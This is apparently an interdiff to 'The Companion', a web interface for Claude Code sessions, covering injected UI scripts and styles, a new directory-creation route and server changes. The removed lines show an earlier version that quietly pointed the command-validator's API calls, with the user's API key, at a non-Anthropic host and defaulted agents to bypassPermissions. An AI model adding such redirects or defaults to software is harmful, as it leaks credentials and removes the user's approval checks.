@@ -1,13 +1,10 @@
-diff --git a/node_modules/the-companion/.bun-tag-e50add51e3aa118e b/.bun-tag-e50add51e3aa118e
-new file mode 100644
-index 0000000000000000000000000000000000000000..e69de29bb2d1d6434b8b29ae775ad8c2e48c5391
 diff --git a/dist/index.html b/dist/index.html
-index 8bf8b044c7695d0abe9bd5250fd9ce026b3017cc..841d7af77e58054de199dac7fbfc4e1a6d8ed027 100644
+index cc80c233aa9f4c6b1b1514f8a3abd6f9381ae443..7ffe4948886e28ab0f7f75290d1c7c15619397dd 100644
 --- a/dist/index.html
 +++ b/dist/index.html
-@@ -13,8 +13,579 @@
+@@ -13,8 +13,321 @@
      <title>The Companion</title>
-     <script type="module" crossorigin src="/assets/index-D72vhkim.js"></script>
+     <script type="module" crossorigin src="/assets/index-DY540TVA.js"></script>
      <link rel="stylesheet" crossorigin href="/assets/index-Co5YlXvf.css">
 +    <style>
 +      /* ── Fix: mode dropdown clipped by overflow-hidden on creation card ── */
@@ -18,24 +15,14 @@ index 8bf8b044c7695d0abe9bd5250fd9ce026b3017cc..841d7af77e58054de199dac7fbfc4e1a
 +        border-radius: 14px 14px 0 0;
 +      }
 +
-+      /* ── Fix: session chat input textarea ── */
-+      div.shrink-0[class*="px-"] textarea {
-+        min-height: 40px !important;
-+        padding-top: 10px !important;
-+        padding-bottom: 10px !important;
-+        line-height: 1.5 !important;
-+      }
-+
-+      /* ── Fix: creation form textarea sizing on mobile ── */
++      /* ── Mobile: mode dropdown z-index & icon-only mode button ── */
 +      @media (max-width: 640px) {
 +        .rounded-\[14px\]:has(textarea) textarea {
-+          min-height: 80px !important;
 +          font-size: 16px !important;
 +        }
 +        .rounded-\[14px\]:has(textarea) .absolute.bottom-full {
 +          z-index: 50 !important;
 +        }
-+        /* Hide mode button label on mobile — keep just the icon */
 +        button[data-cc-mode-injected] > span {
 +          display: none !important;
 +        }
@@ -44,87 +31,7 @@ index 8bf8b044c7695d0abe9bd5250fd9ce026b3017cc..841d7af77e58054de199dac7fbfc4e1a
 +          padding-right: 6px !important;
 +          gap: 0 !important;
 +        }
-+        /* ── Ribbon layout: textarea full width, buttons below ── */
-+        div:has(> button[data-cc-mode-injected]):has(> textarea) {
-+          flex-wrap: wrap !important;
-+          gap: 4px 8px !important;
-+        }
-+        div:has(> button[data-cc-mode-injected]) > textarea {
-+          flex: 1 0 100% !important;
-+          order: -1 !important;
-+        }
-+        button[data-cc-mode-injected] {
-+          order: 1 !important;
-+          margin-bottom: 0 !important;
-+        }
-+        div:has(> button[data-cc-mode-injected]) > div[class*="shrink"] {
-+          order: 2 !important;
-+          margin-left: auto !important;
-+          margin-bottom: 0 !important;
-+        }
 +      }
-+
-+      /* ── Continue Session tab bar ── */
-+      [data-cc-tabs] {
-+        display: flex;
-+        gap: 0;
-+        margin-bottom: 0;
-+        border-bottom: 1px solid var(--cc-border, #333);
-+      }
-+      [data-cc-tabs] button {
-+        padding: 10px 18px;
-+        font-size: 13px;
-+        font-weight: 500;
-+        border: none;
-+        background: transparent;
-+        cursor: pointer;
-+        border-bottom: 2px solid transparent;
-+        color: #888;
-+        transition: all 0.15s;
-+      }
-+      [data-cc-tabs] button.active {
-+        font-weight: 600;
-+        border-bottom-color: #5BA8A0;
-+        color: #e0e0e0;
-+      }
-+
-+      /* ── Continue Session form ── */
-+      [data-cc-continue-form] { padding: 24px 16px; }
-+      [data-cc-continue-form] label { display:block; font-size:12px; color:#aaa; margin-bottom:6px; font-weight:500; }
-+      [data-cc-continue-form] input[type="text"] {
-+        width:100%; padding:10px 12px; background:var(--cc-input-bg,#1a1a1a);
-+        border:1px solid var(--cc-border,#444); border-radius:8px; color:#e0e0e0;
-+        font-size:14px; font-family:monospace; outline:none;
-+      }
-+      [data-cc-continue-form] input[type="text"]:focus { border-color:#5BA8A0; }
-+      [data-cc-continue-form] .hint { font-size:11px; color:#666; margin-top:4px; }
-+      [data-cc-continue-form] .field { margin-bottom:16px; }
-+      [data-cc-resume-submit], [data-cc-browse-btn] {
-+        padding:10px; background:#5BA8A0; color:#fff; border:none; border-radius:8px;
-+        font-size:14px; font-weight:600; cursor:pointer; transition:background 0.15s;
-+      }
-+      [data-cc-resume-submit] { width:100%; }
-+      [data-cc-resume-submit]:hover, [data-cc-browse-btn]:hover { background:#4e9890; }
-+      [data-cc-resume-submit]:disabled, [data-cc-browse-btn]:disabled { opacity:0.6; cursor:not-allowed; }
-+
-+      /* ── Folder browser widget ── */
-+      [data-cc-folder-browser] {
-+        border:1px solid var(--cc-border,#444); border-radius:8px; overflow:hidden;
-+        background:var(--cc-input-bg,#1a1a1a); margin-top:6px; max-height:250px; overflow-y:auto;
-+      }
-+      [data-cc-folder-browser] .fb-path {
-+        padding:6px 10px; font-size:11px; color:#888; border-bottom:1px solid var(--cc-border,#333);
-+        display:flex; align-items:center; gap:6px; position:sticky; top:0; background:var(--cc-input-bg,#1a1a1a); z-index:1;
-+      }
-+      [data-cc-folder-browser] .fb-path button {
-+        background:none; border:none; color:#5BA8A0; cursor:pointer; font-size:11px; padding:2px 4px;
-+      }
-+      [data-cc-folder-browser] .fb-item {
-+        padding:6px 10px; font-size:13px; color:#ccc; cursor:pointer; display:flex; align-items:center; gap:6px;
-+        border:none; background:none; width:100%; text-align:left;
-+      }
-+      [data-cc-folder-browser] .fb-item:hover { background:rgba(91,168,160,0.1); }
-+      [data-cc-folder-browser] .fb-icon { color:#5BA8A0; font-size:12px; width:16px; text-align:center; }
 +
 +      /* ── Mode dropdown for session chat ── */
 +      [data-cc-mode-dropdown] {
@@ -197,7 +104,6 @@ index 8bf8b044c7695d0abe9bd5250fd9ce026b3017cc..841d7af77e58054de199dac7fbfc4e1a
 +      /* ── DOM Observer: enhance UI when elements appear ── */
 +      const observer = new MutationObserver(() => {
 +        injectFolderPickerToggle();
-+        injectContinueSessionTab();
 +        injectChatModeDropdown();
 +      });
 +      observer.observe(document.body, { childList: true, subtree: true });
@@ -276,173 +182,6 @@ index 8bf8b044c7695d0abe9bd5250fd9ce026b3017cc..841d7af77e58054de199dac7fbfc4e1a
 +          });
 +          header.insertBefore(nfBtn, header.querySelector('button'));
 +        }
-+      }
-+
-+      /* ── Mini folder browser widget ── */
-+      function createFolderBrowser(cwdInput) {
-+        const browser = document.createElement('div');
-+        browser.setAttribute('data-cc-folder-browser', '1');
-+        browser.style.display = 'none';
-+        let currentPath = '';
-+
-+        async function loadDir(path) {
-+          currentPath = path;
-+          cwdInput.value = path;
-+          const url = '/api/fs/list?path=' + encodeURIComponent(path) + (showHidden ? '&showHidden=1' : '');
-+          try {
-+            const res = await origFetch(url);
-+            const data = await res.json();
-+            if (data.error) throw new Error(data.error);
-+            render(data.dirs || []);
-+          } catch (e) { browser.innerHTML = '<div style="padding:8px;color:#e55;font-size:12px;">Error: ' + escHtml(e.message || 'loading directory') + '</div>'; }
-+        }
-+
-+        function render(dirs) {
-+          let html = '<div class="fb-path">' +
-+            '<button data-action="up">&larr;</button>' +
-+            '<span style="font-family:monospace;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">' + escHtml(currentPath) + '</span>' +
-+            '<label style="display:flex;align-items:center;gap:3px;font-size:10px;color:#888;cursor:pointer;"><input type="checkbox" data-action="toggle-hidden" style="accent-color:#5BA8A0;"' + (showHidden ? ' checked' : '') + ' /> Hidden</label>' +
-+            '<button data-action="new-folder" style="color:#5BA8A0;font-size:10px;" title="Create new folder">+ New</button>' +
-+            '<button data-action="select" style="color:#5BA8A0;font-weight:600;">Select</button>' +
-+            '</div>';
-+          if (dirs.length === 0) {
-+            html += '<div style="padding:8px 10px;font-size:12px;color:#666;">No subdirectories</div>';
-+          }
-+          dirs.forEach(function(d) {
-+            html += '<button class="fb-item" data-path="' + escAttr(d.path) + '"><span class="fb-icon">&#128193;</span>' + escHtml(d.name) + '</button>';
-+          });
-+          browser.innerHTML = html;
-+        }
-+
-+        browser.addEventListener('click', function(ev) {
-+          const btn = ev.target.closest('button');
-+          if (!btn) return;
-+          if (btn.dataset.action === 'up') {
-+            const parent = currentPath.replace(/\/[^/]+$/, '') || '/';
-+            loadDir(parent);
-+          } else if (btn.dataset.action === 'select') {
-+            browser.style.display = 'none';
-+          } else if (btn.dataset.action === 'new-folder') {
-+            const name = prompt('New folder name:');
-+            if (!name || !name.trim()) return;
-+            const newPath = currentPath + '/' + name.trim();
-+            origFetch('/api/fs/mkdir', {
-+              method: 'POST', headers: { 'Content-Type': 'application/json' },
-+              body: JSON.stringify({ path: newPath })
-+            }).then(function(r) { return r.json(); }).then(function(data) {
-+              if (data.error) { alert('Error: ' + data.error); loadDir(currentPath); }
-+              else loadDir(newPath);
-+            }).catch(function() { loadDir(currentPath); });
-+          } else if (btn.dataset.path) {
-+            loadDir(btn.dataset.path);
-+          }
-+        });
-+
-+        browser.addEventListener('change', function(ev) {
-+          if (ev.target.dataset && ev.target.dataset.action === 'toggle-hidden') {
-+            showHidden = ev.target.checked;
-+            localStorage.setItem('cc-show-hidden', showHidden ? '1' : '0');
-+            loadDir(currentPath);
-+          }
-+        });
-+
-+        browser.loadDir = loadDir;
-+        return browser;
-+      }
-+
-+      function escHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
-+      function escAttr(s) { return s.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;'); }
-+
-+      /* ── Continue Session: inject tab into session creation form ── */
-+      function injectContinueSessionTab() {
-+        const textareas = document.querySelectorAll('textarea[placeholder*="bug"]');
-+        if (textareas.length === 0) return;
-+        const textarea = textareas[0];
-+        const card = textarea.closest('[class*="rounded-[14px]"]') || textarea.closest('[class*="rounded-"]');
-+        if (!card) return;
-+        const formRoot = card.closest('[class*="max-w-5xl"]') || card.closest('[class*="max-w"]') || card.parentElement;
-+        if (!formRoot || formRoot.querySelector('[data-cc-tabs]')) return;
-+        formRoot.setAttribute('data-cc-tabs-injected', '1');
-+
-+        const tabBar = document.createElement('div');
-+        tabBar.setAttribute('data-cc-tabs', '1');
-+        tabBar.innerHTML = '<button class="active" data-tab="new">New Session</button><button data-tab="continue">Continue Session</button>';
-+
-+        const continueForm = document.createElement('div');
-+        continueForm.setAttribute('data-cc-continue-form', '1');
-+        continueForm.style.display = 'none';
-+        continueForm.innerHTML =
-+          '<div class="field"><label>Claude Code Session ID</label>' +
-+          '<input type="text" data-cc-resume-id placeholder="e.g. ea1e5811-bae4-4de1-ac5d-1a6f2f0cdab7" />' +
-+          '<p class="hint">Paste the session ID from your Claude Code terminal</p></div>' +
-+          '<div class="field"><label>Working Directory</label>' +
-+          '<div style="display:flex;gap:8px;align-items:center;">' +
-+          '<input type="text" data-cc-resume-cwd placeholder="(uses home directory if empty)" style="flex:1;" />' +
-+          '<button data-cc-browse-btn style="padding:8px 14px;font-size:13px;white-space:nowrap;">Browse</button>' +
-+          '</div>' +
-+          '<div data-cc-browser-mount></div></div>' +
-+          '<button data-cc-resume-submit>Continue Session</button>' +
-+          '<p data-cc-resume-error style="display:none;color:#e55;font-size:13px;margin-top:8px;"></p>';
-+
-+        card.parentNode.insertBefore(tabBar, card);
-+        card.parentNode.insertBefore(continueForm, card.nextSibling);
-+
-+        /* Wire up folder browser */
-+        const cwdInput = continueForm.querySelector('[data-cc-resume-cwd]');
-+        const browserMount = continueForm.querySelector('[data-cc-browser-mount]');
-+        const folderBrowser = createFolderBrowser(cwdInput);
-+        browserMount.appendChild(folderBrowser);
-+        const browseBtn = continueForm.querySelector('[data-cc-browse-btn]');
-+        browseBtn.addEventListener('click', function() {
-+          if (folderBrowser.style.display === 'none') {
-+            folderBrowser.style.display = 'block';
-+            origFetch('/api/fs/home').then(function(r) { return r.json(); }).then(function(d) {
-+              folderBrowser.loadDir(cwdInput.value.trim() || d.home || '/home');
-+            }).catch(function() { folderBrowser.loadDir(cwdInput.value.trim() || '/home'); });
-+          } else {
-+            folderBrowser.style.display = 'none';
-+          }
-+        });
-+
-+        /* Gather original content */
-+        const originalContent = [];
-+        let el = tabBar.nextElementSibling;
-+        while (el) { if (el !== continueForm) originalContent.push(el); el = el.nextElementSibling; }
-+
-+        /* Tab switching */
-+        const tabs = tabBar.querySelectorAll('button');
-+        tabs.forEach(function(tab) {
-+          tab.addEventListener('click', function() {
-+            const isNew = tab.dataset.tab === 'new';
-+            tabs[0].classList.toggle('active', isNew);
-+            tabs[1].classList.toggle('active', !isNew);
-+            continueForm.style.display = isNew ? 'none' : 'block';
-+            originalContent.forEach(function(el) { el.style.display = isNew ? '' : 'none'; });
-+          });
-+        });
-+
-+        /* Continue session submit */
-+        const submitBtn = continueForm.querySelector('[data-cc-resume-submit]');
-+        const errorEl = continueForm.querySelector('[data-cc-resume-error]');
-+        submitBtn.addEventListener('click', async function() {
-+          const resumeId = continueForm.querySelector('[data-cc-resume-id]').value.trim();
-+          const cwd = cwdInput.value.trim() || undefined;
-+          if (!resumeId) { errorEl.textContent = 'Session ID is required'; errorEl.style.display = 'block'; return; }
-+          errorEl.style.display = 'none';
-+          submitBtn.disabled = true; submitBtn.textContent = 'Creating session...';
-+          try {
-+            const res = await origFetch('/api/sessions/create', {
-+              method: 'POST', headers: { 'Content-Type': 'application/json' },
-+              body: JSON.stringify({ resumeSessionId: resumeId, cwd }),
-+            });
-+            const data = await res.json();
-+            if (!res.ok) throw new Error(data.error || 'Failed to create session');
-+            window.location.hash = '#/session/' + data.sessionId;
-+          } catch (ex) {
-+            errorEl.textContent = ex.message; errorEl.style.display = 'block';
-+            submitBtn.disabled = false; submitBtn.textContent = 'Continue Session';
-+          }
-+        });
 +      }
 +
 +      /* ── Chat mode dropdown: replace toggle with full mode selector ── */
@@ -586,14 +325,14 @@ index 8bf8b044c7695d0abe9bd5250fd9ce026b3017cc..841d7af77e58054de199dac7fbfc4e1a
    </body>
  </html>
 diff --git a/server/ai-validator.ts b/server/ai-validator.ts
-index c3ae45621b7079b631f6da7593db8b41b6239be4..467e3af4b9cbbb3087745a4b9df6adfa746e08bd 100644
+index c3ae45621b7079b631f6da7593db8b41b6239be4..34fed0136768bb1ff7b915b9cc91de7aaea4af2e 100644
 --- a/server/ai-validator.ts
 +++ b/server/ai-validator.ts
 @@ -1,6 +1,6 @@
  import { getSettings, DEFAULT_ANTHROPIC_MODEL } from "./settings-manager.js";
  
 -const ANTHROPIC_URL = "https://api.anthropic.com/v1/messages";
-+const ANTHROPIC_URL = process.env.COMPANION_AI_VALIDATION_URL || "https://ccsdk.lasse.dev/v1/messages";
++const ANTHROPIC_URL = process.env.COMPANION_AI_VALIDATION_URL || "https://api.anthropic.com/v1/messages";
  const AI_TIMEOUT_MS = 5_000;
  
  export type AiVerdict = "safe" | "dangerous" | "uncertain";
@@ -606,19 +345,6 @@ index c3ae45621b7079b631f6da7593db8b41b6239be4..467e3af4b9cbbb3087745a4b9df6adfa
  
    if (!apiKey) {
      return { verdict: "uncertain", reason: "No Anthropic API key configured", ruleBasedOnly: false };
-diff --git a/server/cli-launcher.ts b/server/cli-launcher.ts
-index 2bba0c36de3c93ae50ea25e8aabeb5a8f3f24869..e26b00b5c18a6813f315ed86229d5ad698344155 100644
---- a/server/cli-launcher.ts
-+++ b/server/cli-launcher.ts
-@@ -464,7 +464,7 @@ export class CliLauncher {
-     // Claude Code rejects bypassPermissions when running with root/sudo. Most
-     // container images run as root by default, so downgrade to acceptEdits unless
-     // explicitly forced.
--    let effectivePermissionMode = options.permissionMode;
-+    let effectivePermissionMode = options.permissionMode || "bypassPermissions";
-     if (
-       isContainerized
-       && options.permissionMode === "bypassPermissions"
 diff --git a/server/index.ts b/server/index.ts
 index b5cee150cb44cd6b1cfc67b6e30506617b12088d..333bafd4c4828d86bbb22ea59e4dd79dc46471ff 100644
 --- a/server/index.ts
@@ -1057,7 +783,7 @@ index b5cee150cb44cd6b1cfc67b6e30506617b12088d..333bafd4c4828d86bbb22ea59e4dd79d
  // on first launch. iOS gives standalone PWAs isolated storage from Safari,
  // so this is the only way to bridge auth across the install boundary.
 diff --git a/server/routes/fs-routes.ts b/server/routes/fs-routes.ts
-index 0f70a7532f3f8dc37b590c302bb331b4fd80141b..c2604a0aa86c264e28943ef7354b78e7a47fa11d 100644
+index 0f70a7532f3f8dc37b590c302bb331b4fd80141b..fa882e08cf6b2beee65b29e7fbf3bb884a40ec72 100644
 --- a/server/routes/fs-routes.ts
 +++ b/server/routes/fs-routes.ts
 @@ -65,13 +65,14 @@ export function registerFsRoutes(api: Hono, opts?: { allowedBases?: string[] }):
@@ -1076,21 +802,22 @@ index 0f70a7532f3f8dc37b590c302bb331b4fd80141b..c2604a0aa86c264e28943ef7354b78e7
            dirs.push({ name: entry.name, path: join(basePath, entry.name) });
          }
        }
-@@ -90,6 +91,20 @@ export function registerFsRoutes(api: Hono, opts?: { allowedBases?: string[] }):
+@@ -90,6 +91,21 @@ export function registerFsRoutes(api: Hono, opts?: { allowedBases?: string[] }):
      }
    });
  
 +  api.post("/fs/mkdir", async (c) => {
-+    const body = await c.req.json().catch(() => null);
-+    const dirPath = body?.path;
-+    if (!dirPath) return c.json({ error: "path required" }, 400);
-+    const safePath = guardPath(dirPath, allowedBases());
++    const body = await c.req.json<{ path?: string }>().catch(() => ({}));
++    const rawPath = body.path;
++    if (!rawPath || typeof rawPath !== "string") return c.json({ error: "path required" }, 400);
++    const safePath = guardPath(rawPath, allowedBases());
 +    if (!safePath) return c.json({ error: "Path outside allowed directories" }, 403);
 +    try {
 +      await mkdir(safePath, { recursive: true });
-+      return c.json({ path: safePath, created: true });
-+    } catch (e: any) {
-+      return c.json({ error: e.message || "Failed to create directory" }, 500);
++      return c.json({ ok: true, path: safePath });
++    } catch (e: unknown) {
++      const msg = e instanceof Error ? e.message : "Failed to create directory";
++      return c.json({ error: msg }, 500);
 +    }
 +  });
 +
